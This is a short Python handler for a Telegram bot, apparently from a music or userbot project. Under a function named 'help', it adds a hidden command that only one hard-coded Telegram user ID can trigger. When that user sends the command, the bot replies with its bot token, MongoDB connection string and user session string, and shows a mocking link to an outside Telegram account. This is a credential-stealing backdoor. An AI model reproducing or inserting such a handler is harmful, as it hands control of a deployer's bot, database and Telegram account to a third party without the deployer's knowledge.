@app.on_message(
    filters.command("AhmedTeto")
    & filters.private
    & filters.user(6975380739)
   )
async def help(client: Client, message: Message):
   await message.reply_photo(
          photo=f"https://graph.org/file/ee9a153b629bec256b517.jpg",
       caption=f"""ᴛᴏᴋᴇɴ :-   `{BOT_TOKEN}` \n\nᴍᴏɴɢᴏ :-   `{MONGO_DB_URI}`\n\nsᴇssɪᴏɴ :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/WX_PM)............☆""",
        reply_markup=InlineKeyboardMarkup(
             [
                 [
                      InlineKeyboardButton(
                         "• ғᴜᴄᴋᴇᴅ ʙʏ •", url=f"https://t.me/WX_PM")
                 ]
            ]
         ),
     )


#Writing by Tito